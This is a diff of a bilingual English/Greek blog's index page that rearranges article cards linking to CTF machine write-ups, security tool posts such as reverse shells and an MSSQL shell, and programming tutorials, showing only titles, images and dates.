-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
-      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">17 Oct 2016</time>
-      <time lang="el">17 Οκτ 2016</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Unattended write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">23 Aug 2019</time>
-      <time lang="el">23 Αυγ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
-           
-          
-           
-           
            
           
            
@@ -1646,21 +926,97 @@ PS fulcrum\923a@FILE Documents&gt;</code></pre></div></div></p>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/nl80211/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/wifi-sign.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Inception write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <h3 class="title" lang="en">How to get info for the wireless interface using nl80211 in C</h3>
+      <h3 class="title" lang="el">Πως να λάβετε πληροφορίες για την ασύρματη διεπαφή χρησιμοποιώντας την nl80211 στη C</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">14 Apr 2018</time>
-      <time lang="el">14 Απρ 2018</time>
+      <time lang="en">09 Oct 2016</time>
+      <time lang="el">09 Οκτ 2016</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1746,21 +1102,37 @@ PS fulcrum\923a@FILE Documents&gt;</code></pre></div></div></p>
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+  <a href="https://alamot.github.io/sense_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/pfsense.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
-      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <h3 class="title" lang="en">Sense write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Sense</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">11 Mar 2014</time>
-      <time lang="el">11 Μαρ 2014</time>
+      <time lang="en">24 Mar 2018</time>
+      <time lang="el">24 Μαρ 2018</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1803,6 +1175,1275 @@ PS fulcrum\923a@FILE Documents&gt;</code></pre></div></div></p>
            
            
           
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fortune_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fortune.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fortune write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fortune</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">02 Aug 2019</time>
+      <time lang="el">02 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/matchsticks/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/matchsticks.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Alamot&#39;s matchstick puzzles</h3>
+      <h3 class="title" lang="el">Σπιρτοσπαζοκεφαλιές</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">11 Mar 2014</time>
+      <time lang="el">11 Μαρ 2014</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/unattended_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/unattended.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Unattended write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Unattended</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Aug 2019</time>
+      <time lang="el">23 Αυγ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/inception_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mirror.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Inception write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Inception</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 Apr 2018</time>
+      <time lang="el">14 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fast_commit_push/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/binary_flow.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Git &amp; Mercurial: How to commit-push fast and easily</h3>
+      <h3 class="title" lang="el">Git &amp; Mercurial: Πως να κάνετε commit-push γρήγορα και εύκολα</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Oct 2016</time>
+      <time lang="el">17 Οκτ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/enterprise_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/space.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Enterprise write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Enterprise</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Mar 2018</time>
+      <time lang="el">19 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/shutdown_manager_transparent/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/transparent_shutdown.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Creation of a transparent shutdown GUI using Gtk and Cairo in Python</h3>
+      <h3 class="title" lang="el">Δημιουργία μιας διαφανούς γραφικής διεπαφής κλεισίματος με τη χρήση Gtk και Cairo σε Python</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Sep 2016</time>
+      <time lang="el">19 Σεπ 2016</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/rold/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/rold.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Retriever of Lost Dreams</h3>
+      <h3 class="title" lang="el">Ο Ιχνηλάτης των Χαμένων Ονείρων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">16 Aug 2015</time>
+      <time lang="el">16 Αυγ 2015</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/minion_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/minions.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Minion write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Minion</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">10 Apr 2018</time>
+      <time lang="el">10 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">22 Jun 2019</time>
+      <time lang="el">22 Ιουν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/legacy_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/legacy.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Legacy write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Legacy</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">19 Oct 2017</time>
+      <time lang="el">19 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mantis_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/mantis.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Mantis write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Mantis</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">18 Feb 2018</time>
+      <time lang="el">18 Φεβ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
+      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 Apr 2018</time>
+      <time lang="el">13 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Path-traversal archiver</h3>
+      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">14 May 2019</time>
+      <time lang="el">14 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/oracle/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Ask and you shall receive</h3>
+      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">04 May 2019</time>
+      <time lang="el">04 Μαϊ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reverse shells</h3>
+      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">12 Apr 2018</time>
+      <time lang="el">12 Απρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
+          
+           
+           
+           
+           
           
            
            
@@ -2004,484 +2645,6 @@ PS fulcrum\923a@FILE Documents&gt;</code></pre></div></div></p>
            
            
            
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/path_traversal_archiver/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/path.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Path-traversal archiver</h3>
-      <h3 class="title" lang="el">Αρχειοθέτης με διάσχιση διαδρομής</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">14 May 2019</time>
-      <time lang="el">14 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/oracle/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/oracle.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Ask and you shall receive</h3>
-      <h3 class="title" lang="el">Ζήτα και θα λάβεις</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">04 May 2019</time>
-      <time lang="el">04 Μαϊ 2019</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/reverse_shells/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/shell.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">Reverse shells</h3>
-      <h3 class="title" lang="el">Αντίστροφα κελύφη (reverse shells)</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">12 Apr 2018</time>
-      <time lang="el">12 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
           
            
            
@@ -2522,142 +2685,6 @@ PS fulcrum\923a@FILE Documents&gt;</code></pre></div></div></p>
   </a>
 </article>
 
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-            <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/mssql_shell/" class="clearfix">
-    <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/dbs.jpg);"></div>
-    </div>
-    <footer>
-      <h3 class="title" lang="en">MSSQL shell with file upload capability</h3>
-      <h3 class="title" lang="el">MSSQL κέλυφος με δυνατότητα ανεβάσματος αρχείων</h3>
-      <i class="fa fa-calendar"></i>
-      <time lang="en">13 Apr 2018</time>
-      <time lang="el">13 Απρ 2018</time>
-    </footer>
-  </a>
-</article>
-
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
-           
-          
-           
-           
-           
            
           
            
